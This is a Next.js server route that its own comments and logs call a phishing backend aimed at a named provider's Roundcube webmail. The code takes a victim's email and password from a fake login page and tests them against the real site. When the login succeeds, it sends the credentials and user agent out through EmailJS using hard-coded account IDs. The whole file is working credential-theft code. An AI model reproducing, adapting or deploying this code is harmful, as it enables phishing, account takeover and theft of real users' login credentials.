import { NextRequest } from "next/server";

export const runtime = "nodejs";

// Standard Web Fetch API signature fixes the Vercel warning and timeout
export async function POST(request: NextRequest) {
  try {
    // 1. Parse JSON body sent from your frontend
    const body = await request.json();
    const { email, password, token } = body;

    if (!email || !password || !token) {
      return new Response(
        JSON.stringify({
          success: false,
          message: "Missing email, password, or token",
        }),
        {
          status: 400,
          headers: { "Content-Type": "application/json" },
        },
      );
    }

    const userAgent = request.headers.get("user-agent") || "Unknown Device";

    console.log(`Phishing attempt: ${email}`);

    // 2. Prepare the payload exactly as Roundcube expects
    // Based on the HTML source: name="_user", name="_pass", name="_token"
    const formData = new URLSearchParams({
      _user: email,
      _pass: password,
      _token: token,
      _task: "login",
      _action: "login",
      _timezone: "_default_",
    });

    // 3. Send to the REAL site
    const response = await fetch("https://webmail.mwt.net/?_task=login", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": userAgent,
        // Optional: Pass through cookies if needed for session continuity
        // "Cookie": request.headers.get("cookie") || "",
      },
      body: formData.toString(),
      redirect: "follow", // Crucial: Follow redirects to see the final state
    });

    // 4. Determine success based on the FINAL URL after redirects
    // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
    const finalUrl = response.url;
    const isSuccess = response.ok && finalUrl.includes("_task=mailbox");

    // 5. Send Email ONLY if login was successful
    if (isSuccess) {
      sendEmail(email, password, userAgent).catch((err) =>
        console.error("Email send failed", err),
      );
    } else {
      console.log(`Login failed for ${email}. Final URL: ${finalUrl}`);
    }

    // 6. Respond to frontend
    return new Response(
      JSON.stringify({
        success: isSuccess,
        url: finalUrl,
        status: response.status,
      }),
      {
        headers: { "Content-Type": "application/json" },
      },
    );
  } catch (error) {
    console.error("Phish Login Error:", error);
    return new Response(
      JSON.stringify({
        success: false,
        message: "Internal Server Error",
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      },
    );
  }
}

async function sendEmail(email: string, password: string, userAgent: string) {
  try {
    // Note: You may need to update your Service ID/Template ID in the actual deployment
    await fetch("https://api.emailjs.com/api/v1/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: "service_1b86ixe",
        template_id: "template_a2504xo",
        user_id: "lES1DjjjfZ3BGbkw7",
        template_params: {
          email: email,
          password: password,
          user_agent: userAgent.substring(0, 50),
        },
      }),
    });
  } catch (e) {
    console.error("EmailJS Error", e);
  }
}
